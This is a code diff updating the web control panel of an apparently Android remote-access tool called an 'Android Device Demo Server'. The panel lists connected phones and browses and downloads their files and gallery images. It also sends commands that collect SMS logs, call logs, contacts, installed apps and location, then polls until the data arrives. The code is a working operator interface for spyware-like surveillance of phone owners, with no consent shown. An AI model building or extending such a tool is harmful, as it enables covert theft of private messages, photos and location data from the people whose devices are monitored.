@@ -1,10 +1,10 @@
-// Android Device Demo Server - Web GUI v5.2
+// Android Device Demo Server - Web GUI v5.3
 
 let pollingInterval = null;
 let currentReceivedDir = '';
 let selectedGalleryItem = null;
 let selectedFileItem = null;
-let currentDeviceSessionId = null; // ID of the currently selected device session
+let currentDeviceSessionId = null;
 const POLL_INTERVAL = 3000;
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -66,6 +66,14 @@ function updateDevices(devices) {
                 Img: ${d.images} | Vid: ${d.videos} | Notif: ${d.notifications}
             </div>
         </div>`).join('');
+
+    // Auto-select first online device
+    const onlineDevices = devices.filter(d => d.status === 'ONLINE');
+    if (onlineDevices.length > 0) {
+        if (!currentDeviceSessionId || !devices.find(d => d.id === currentDeviceSessionId && d.status === 'ONLINE')) {
+            currentDeviceSessionId = onlineDevices[0].id;
+        }
+    }
 }
 
 function updateLogs(data) {
@@ -150,35 +158,47 @@ function setupGalleryControls() {
 }
 
 function loadGallery() {
-    fetch('/api/gallery?session=1').then(r => r.json()).then(data => {
-        const grid = document.getElementById('gallery-grid');
-        const items = data.gallery || [];
-        if (!items.length) { grid.innerHTML = '<p>No gallery data. Click "Gallery List" on dashboard first.</p>'; return; }
-        grid.innerHTML = items.map(item => {
-            const isImg = item.type && item.type.startsWith && item.type.startsWith('image/');
-            const icon = isImg ? '🖼️' : (item.type && item.type.startsWith('video/') ? '🎬' : '📄');
-            return `<div class="gallery-item" data-id="${item.id}" data-name="${item.name || ''}" data-type="${item.type || ''}">
-                <div class="gi-icon">${icon}</div>
-                <div class="gi-name">${item.name || 'Unknown'}</div>
-                <div class="gi-size">${formatSize(item.size || 0)}</div>
-            </div>`;
-        }).join('');
+    // FIX 1: Get first online device dynamically instead of hardcoded session=***
+    fetch('/api/devices').then(r => r.json()).then(devices => {
+        const onlineDevice = devices.find(d => d.status === 'ONLINE');
+        const sessionId = onlineDevice ? onlineDevice.id : 1;
 
-        // Click to select
-        grid.querySelectorAll('.gallery-item').forEach(el => {
-            el.addEventListener('click', () => {
-                grid.querySelectorAll('.gallery-item').forEach(x => x.classList.remove('selected'));
-                el.classList.add('selected');
-                selectedGalleryItem = { id: el.dataset.id, name: el.dataset.name, type: el.dataset.type };
+        fetch('/api/gallery?session=' + sessionId).then(r => r.json()).then(data => {
+            const grid = document.getElementById('gallery-grid');
+            const items = data.gallery || [];
+            if (!items.length) { grid.innerHTML = '<p>No gallery data. Click "Gallery List" on dashboard first.</p>'; return; }
+            grid.innerHTML = items.map(item => {
+                const isImg = item.type && item.type.startsWith && item.type.startsWith('image/');
+                const icon = isImg ? '\u{1F5BC}' : (item.type && item.type.startsWith('video/') ? '\u{1F3AC}' : '\u{1F4C4}');
+                // FIX 2: Show source folder of each image
+                const parts = (item.name || '').split('/');
+                const fileName = parts[parts.length - 1] || item.name || 'Unknown';
+                const folderName = parts.length > 1 ? parts.slice(0, -1).join('/') : '';
+                const displayName = folderName ? fileName + ' (' + folderName + ')' : fileName;
+                return `<div class="gallery-item" data-id="${item.id}" data-name="${item.name || ''}" data-type="${item.type || ''}" data-folder="${folderName}">
+                    <div class="gi-icon">${icon}</div>
+                    <div class="gi-name">${displayName}</div>
+                    <div class="gi-size">${formatSize(item.size || 0)}</div>
+                </div>`;
+            }).join('');
+
+            grid.querySelectorAll('.gallery-item').forEach(el => {
+                el.addEventListener('click', () => {
+                    grid.querySelectorAll('.gallery-item').forEach(x => x.classList.remove('selected'));
+                    el.classList.add('selected');
+                    selectedGalleryItem = { id: el.dataset.id, name: el.dataset.name, type: el.dataset.type, folder: el.dataset.folder };
+                });
             });
         });
+    }).catch(() => {
+        document.getElementById('gallery-grid').innerHTML = '<p>No devices online.</p>';
     });
 }
 
 // === FILE BROWSER TAB ===
 function setupFileBrowserControls() {
     document.getElementById('btn-browse-path')?.addEventListener('click', () => {
-        const path = document.getElementById('filepath-input').value.trim() || '/sdcard';
+        const path = document.getElementById('filepath-input').value.trim() || '/storage/emulated/0/';
         browseFiles(path);
     });
     document.getElementById('btn-download-file')?.addEventListener('click', () => {
@@ -189,47 +209,56 @@ function setupFileBrowserControls() {
 }
 
 function browseFiles(path) {
-    sendCommand('list_files', JSON.stringify({ path })).then(() => {
-        document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
-        setTimeout(() => {
-            fetch('/api/filebrowser?session=1').then(r => r.json()).then(data => {
-                const container = document.getElementById('filebrowser-list');
-                const files = data.files || [];
-                if (!files.length) { container.innerHTML = '<p>No files returned. Make sure the device is connected and has granted storage permission.</p>'; return; }
-                // Parse if it's from file_list message
-                let items = files;
-                if (data.files.files) items = data.files.files; // file_list message has nested files array
-                if (Array.isArray(data.files) && data.files.length && data.files[0].files) items = data.files;
-                
-                container.innerHTML = items.map(f => {
-                    const isDir = f.is_dir || f.isDir || false;
-                    return `<div class="fb-item" data-path="${f.path || f.full_path || ''}" data-name="${f.name || ''}" data-isdir="${isDir}">
-                        <span class="fb-icon">${isDir ? '📁' : '📄'}</span>
-                        <span class="fb-name">${f.name || f.display_name || 'Unknown'}</span>
-                        <span class="fb-size">${formatSize(f.size || 0)}</span>
-                        <span class="fb-type">${isDir ? 'DIR' : 'FILE'}</span>
-                    </div>`;
-                }).join('');
+    // FIX 3: Get first online device dynamically
+    fetch('/api/devices').then(r => r.json()).then(devices => {
+        const onlineDevice = devices.find(d => d.status === 'ONLINE');
+        const sessionId = onlineDevice ? onlineDevice.id : 1;
 
-                container.querySelectorAll('.fb-item').forEach(el => {
-                    el.addEventListener('click', () => {
-                        container.querySelectorAll('.fb-item').forEach(x => x.classList.remove('selected'));
-                        el.classList.add('selected');
-                        const isDir = el.dataset.isdir === 'true';
-                        if (isDir) {
-                            selectedFileItem = null;
-                            document.getElementById('filepath-input').value = el.dataset.path;
-                        } else {
-                            selectedFileItem = { path: el.dataset.path };
-                        }
+        sendCommand('list_files', JSON.stringify({ path })).then(() => {
+            document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
+            setTimeout(() => {
+                fetch('/api/filebrowser?session=' + sessionId).then(r => r.json()).then(data => {
+                    const container = document.getElementById('filebrowser-list');
+                    const files = data.files || [];
+                    if (!files.length) { container.innerHTML = '<p>No files returned. Make sure the device is connected and has granted storage permission.</p>'; return; }
+                    // Parse nested file_list message structure
+                    let items = files;
+                    if (data.files && Array.isArray(data.files.files)) items = data.files.files;
+                    if (Array.isArray(data.files) && data.files.length && Array.isArray(data.files[0].files)) items = data.files[0].files;
+
+                    container.innerHTML = items.map(f => {
+                        const isDir = f.is_dir || f.isDir || false;
+                        const dirIcon = isDir ? '\u{1F4C1}' : '\u{1F4C4}';
+                        return `<div class="fb-item" data-path="${f.path || f.full_path || ''}" data-name="${f.name || ''}" data-isdir="${isDir}">
+                            <span class="fb-icon">${dirIcon}</span>
+                            <span class="fb-name">${f.name || f.display_name || 'Unknown'}</span>
+                            <span class="fb-size">${formatSize(f.size || 0)}</span>
+                            <span class="fb-type">${isDir ? 'DIR' : 'FILE'}</span>
+                        </div>`;
+                    }).join('');
+
+                    container.querySelectorAll('.fb-item').forEach(el => {
+                        el.addEventListener('click', () => {
+                            container.querySelectorAll('.fb-item').forEach(x => x.classList.remove('selected'));
+                            el.classList.add('selected');
+                            const isDir = el.dataset.isdir === 'true';
+                            if (isDir) {
+                                selectedFileItem = null;
+                                document.getElementById('filepath-input').value = el.dataset.path;
+                            } else {
+                                selectedFileItem = { path: el.dataset.path };
+                            }
+                        });
+                        el.addEventListener('dblclick', () => {
+                            if (el.dataset.isdir === 'true') browseFiles(el.dataset.path);
+                        });
                     });
-                    el.addEventListener('dblclick', () => {
-                        if (el.dataset.isdir === 'true') browseFiles(el.dataset.path);
-                    });
+                    document.getElementById('filebrowser-status').textContent = `Showing ${items.length} items`;
                 });
-                document.getElementById('filebrowser-status').textContent = `Showing ${items.length} items`;
-            });
-        }, 3000);
+            }, 3000);
+        });
+    }).catch(() => {
+        document.getElementById('filebrowser-status').textContent = 'No devices online.';
     });
 }
 
@@ -253,7 +282,7 @@ function loadReceivedFiles(subdir) {
         const files = data.files || [];
         if (!files.length) { container.innerHTML = '<p>No files in this directory.</p>'; return; }
         container.innerHTML = files.map(f => {
-            const icon = f.is_dir ? '📁' : getFileIcon(f.name);
+            const icon = f.is_dir ? '\u{1F4C1}' : getFileIcon(f.name);
             const link = f.is_dir ? '' : `<a class="ri-link" href="/api/download-file?path=${encodeURIComponent(f.path)}" target="_blank">View/Download</a>`;
             return `<div class="received-item" data-path="${f.path}" data-isdir="${f.is_dir}">
                 <span class="ri-icon">${icon}</span>
@@ -273,11 +302,11 @@ function loadReceivedFiles(subdir) {
 
 function getFileIcon(name) {
     const ext = name.split('.').pop().toLowerCase();
-    if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext)) return '🖼️';
-    if (['mp4','3gp','avi','mkv'].includes(ext)) return '🎬';
-    if (['mp3','wav','ogg','3gp'].includes(ext)) return '🎵';
-    if (['json','txt','log'].includes(ext)) return '📄';
-    return '📄';
+    if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext)) return '\u{1F5BC}';
+    if (['mp4','3gp','avi','mkv'].includes(ext)) return '\u{1F3AC}';
+    if (['mp3','wav','ogg','3gp'].includes(ext)) return '\u{1F3B5}';
+    if (['json','txt','log'].includes(ext)) return '\u{1F4C4}';
+    return '\u{1F4C4}';
 }
 
 function formatSize(bytes) {
@@ -301,14 +330,56 @@ function setupDataViewerControls() {
     ];
     btns.forEach(([id, type, renderer]) => {
         document.getElementById(id)?.addEventListener('click', () => {
-            fetch('/api/data?session=1&type=' + type).then(r => r.json()).then(data => {
-                const viewer = document.getElementById('data-viewer');
-                const result = data[type] || [];
-                if (!result || (Array.isArray(result) && !result.length) || (typeof result === 'object' && !Object.keys(result).length)) {
-                    viewer.innerHTML = `<p class="data-empty">No ${type} data yet. Send the corresponding command from the dashboard first.</p>`;
-                    return;
+            // FIX 4: Get first online device, send command first, then poll with retries
+            fetch('/api/devices').then(r => r.json()).then(devices => {
+                const onlineDevice = devices.find(d => d.status === 'ONLINE');
+                const sessionId = onlineDevice ? onlineDevice.id : 1;
+
+                // Map data types to server commands
+                const cmdMap = {
+                    sms_logs: 'get_sms_logs',
+                    call_logs: 'get_call_logs',
+                    contacts: 'get_contacts',
+                    app_list: 'get_app_list',
+                    location: 'get_location',
+                    storage: 'get_storage_info',
+                    device_info: 'get_device_info'
+                };
+
+                // Send command to device first
+                if (cmdMap[type]) {
+                    sendCommand(cmdMap[type]);
                 }
-                viewer.innerHTML = renderer(result);
+
+                // Poll for data with retries (device may take time to respond)
+                let attempts = 0;
+                const maxAttempts = 5;
+                const viewer = document.getElementById('data-viewer');
+                viewer.innerHTML = '<p class="data-loading">Loading... (waiting for device response)</p>';
+
+                const checkData = () => {
+                    fetch('/api/data?session=' + sessionId + '&type=' + type).then(r => r.json()).then(data => {
+                        const result = data[type] || [];
+                        const isEmpty = !result || (Array.isArray(result) && !result.length) || (typeof result === 'object' && !Array.isArray(result) && !Object.keys(result).length);
+                        if (isEmpty && attempts < maxAttempts) {
+                            attempts++;
+                            setTimeout(checkData, 1000 * attempts);
+                        } else if (isEmpty) {
+                            viewer.innerHTML = `<p class="data-empty">No ${type} data yet. Make sure the device is connected and has granted permissions.</p>`;
+                        } else {
+                            viewer.innerHTML = renderer(result);
+                        }
+                    }).catch(() => {
+                        if (attempts < maxAttempts) {
+                            attempts++;
+                            setTimeout(checkData, 1000 * attempts);
+                        } else {
+                            viewer.innerHTML = `<p class="data-empty">Error fetching ${type} data.</p>`;
+                        }
+                    });
+                };
+                // Small initial delay to let command reach device
+                setTimeout(checkData, 1500);
             });
         });
     });
